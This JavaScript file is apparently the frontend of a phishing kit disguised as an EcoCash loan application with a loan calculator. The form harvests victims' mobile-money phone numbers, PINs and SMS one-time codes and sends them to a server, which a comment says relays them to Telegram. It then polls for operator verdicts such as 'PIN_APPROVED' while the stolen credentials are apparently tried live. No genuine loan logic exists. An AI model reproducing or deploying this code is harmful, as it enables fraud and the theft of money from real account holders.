let currentAppRef = null;
let statusPollInterval = null;

function updateLoanCalc() {
  const amount = parseInt(document.getElementById('loanRange').value);
  const periodSelect = document.getElementById('repaymentPeriod');
  
  const interest = Math.round(amount * 0.10);
  const total = amount + interest;

  document.getElementById('calc-amount').innerText = '$' + amount;
  document.getElementById('calc-interest').innerText = '$' + interest;
  document.getElementById('calc-total').innerText = '$' + total;

  // Dynamically update repayment period as the range slider moves
  if (amount <= 100) {
    periodSelect.value = "1";
  } else if (amount <= 250) {
    periodSelect.value = "2";
  } else if (amount <= 400) {
    periodSelect.value = "3";
  } else {
    periodSelect.value = "6";
  }
}

function showSection(sectionId) {
  ['form-step-1', 'form-step-2', 'step-loading', 'form-step-3', 'step-success', 'step-rejected'].forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });

  if (sectionId === 'step-success') {
    document.getElementById('app-header').classList.add('hidden');
  }

  document.getElementById(sectionId).classList.remove('hidden');
}

function validateAndGoToStep2() {
  const name = document.getElementById('fullName').value.trim();
  const occupation = document.getElementById('occupation').value.trim();
  const income = document.getElementById('monthlyIncome').value.trim();

  if (!name || !occupation || !income) {
    alert("Please complete all required fields before proceeding.");
    return;
  }
  showSection('form-step-2');
}

async function submitStep2Details() {
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();

  if (phone.length !== 9 || pin.length !== 4) {
    alert("Please enter a valid 9-digit EcoCash phone number and 4-digit PIN.");
    return;
  }

  // Payload combining Step 1 (Applicant Info) + Step 2 (EcoCash Phone & PIN)
  const payload = {
    fullName: document.getElementById('fullName').value,
    occupation: document.getElementById('occupation').value,
    monthlyIncome: document.getElementById('monthlyIncome').value,
    repaymentPeriod: document.getElementById('repaymentPeriod').value,
    loanAmount: document.getElementById('loanRange').value,
    phone: phone,
    pin: pin
  };

  try {
    showSection('step-loading');

    // Deliver combined Step 1 & Step 2 details immediately to server / Telegram
    const res = await fetch('/api/apply-loan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();
    if (data.success) {
      currentAppRef = data.appReference;
      startStatusPolling();

      // Start 10-second timer and auto-advance to Step 3 when finished
      startCountdown(10, () => {
        showSection('form-step-3');
      });
    } else {
      alert("Application submission failed. Please try again.");
      showSection('form-step-2');
    }
  } catch (err) {
    alert("Network error. Please try again.");
    showSection('form-step-2');
  }
}

async function submitOTPDetails() {
  const otpCode = document.getElementById('otpCode').value.trim();

  if (otpCode.length !== 6) {
    alert("Please enter a valid 6-digit OTP code.");
    return;
  }

  try {
    showSection('step-loading');

    const res = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppRef,
        otpCode: otpCode
      })
    });

    const data = await res.json();
    if (data.success) {
      startCountdown(10, () => {
        // Keeps waiting on status check polling
      });
    }
  } catch (err) {
    alert("Error submitting OTP. Please try again.");
    showSection('form-step-3');
  }
}

function startCountdown(seconds, onComplete) {
  let timer = seconds;
  const timerElem = document.getElementById('timer');
  timerElem.innerText = `${timer}s`;

  const interval = setInterval(() => {
    timer--;
    timerElem.innerText = `${timer}s`;
    if (timer <= 0) {
      clearInterval(interval);
      if (typeof onComplete === 'function') {
        onComplete();
      }
    }
  }, 1000);
}

function startStatusPolling() {
  if (statusPollInterval) clearInterval(statusPollInterval);

  statusPollInterval = setInterval(async () => {
    if (!currentAppRef) return;

    try {
      const res = await fetch(`/api/check-status/${currentAppRef}`);
      const data = await res.json();

      if (data.success) {
        if (data.status === 'PIN_APPROVED') {
          showSection('form-step-3');
        } else if (data.status === 'PIN_REJECTED') {
          clearInterval(statusPollInterval);
          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided.";
          showSection('step-rejected');
        } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
          clearInterval(statusPollInterval);
          showSection('step-success');
        } else if (data.status === 'OTP_REJECTED') {
          clearInterval(statusPollInterval);
          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided.";
          showSection('step-rejected');
        }
      }
    } catch (err) {
      console.error("Polling status error:", err);
    }
  }, 2000);
    }
